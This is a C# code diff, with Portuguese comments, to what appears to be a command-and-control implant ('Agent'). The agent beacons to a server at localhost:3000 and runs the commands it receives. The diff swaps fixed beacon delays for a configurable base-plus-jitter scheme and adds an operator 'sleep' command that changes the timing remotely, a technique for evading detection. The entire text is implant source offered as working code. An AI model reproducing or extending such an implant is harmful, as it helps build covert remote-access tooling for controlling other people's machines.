@@ -10,8 +10,8 @@ class Agent
 {
     // Configuração do servidor e beacon
     static readonly string SERVER_URL    = "http://localhost:3000";
-    static readonly int    BEACON_MIN_MS = 5000;
-    static readonly int    BEACON_MAX_MS = 12000;
+    static int    BEACON_BASE = 5;
+    static int    BEACON_JITTER = 50;
     static readonly int    CMD_TIMEOUT_MS = 30000;
 
     static readonly HttpClient http = new HttpClient();
@@ -67,9 +67,11 @@ class Agent
             }
 
             var rng   = new Random();
-            int delay = rng.Next(BEACON_MIN_MS, BEACON_MAX_MS);
-            Console.WriteLine($"[*] Aguardando {delay / 1000}s...");
-            Thread.Sleep(delay);
+            int minDelay = BEACON_BASE - BEACON_BASE * BEACON_JITTER / 100;
+            int maxDelay = BEACON_BASE + BEACON_BASE * BEACON_JITTER / 100;
+            int delay = rng.Next(minDelay, Math.Max(minDelay + 1, maxDelay));
+            Console.WriteLine($"[*] Aguardando {delay}s...");
+            await Task.Delay(delay * 1000);
         }
     }
 
@@ -87,6 +89,25 @@ class Agent
         if (trimmed == "pwd")
         {
             return currentDir;
+        }
+        if (trimmed == "sleep" || trimmed.StartsWith("sleep "))
+        {
+            string[] parts = trimmed.Split(' ');
+
+            if (parts.Length < 2)
+            return "Uso: sleep base(s) jitter (%)";
+
+            if (!int.TryParse(parts[1], out int newBase))
+            return "Valor inválido para base";
+
+            int newJitter = 50; // default
+            if (parts.Length >= 3 && int.TryParse(parts[2], out int j))
+                newJitter = j;
+            
+            BEACON_BASE = newBase;
+            BEACON_JITTER = newJitter;
+
+            return $"Sleep alterado: base={BEACON_BASE}s, jitter=±{BEACON_JITTER}% - próximo delay entre {BEACON_BASE - BEACON_BASE * BEACON_JITTER / 100}s e {BEACON_BASE + BEACON_BASE * BEACON_JITTER / 100}s";
         }
 
         return ExecuteCommand(trimmed, stdin, shell);
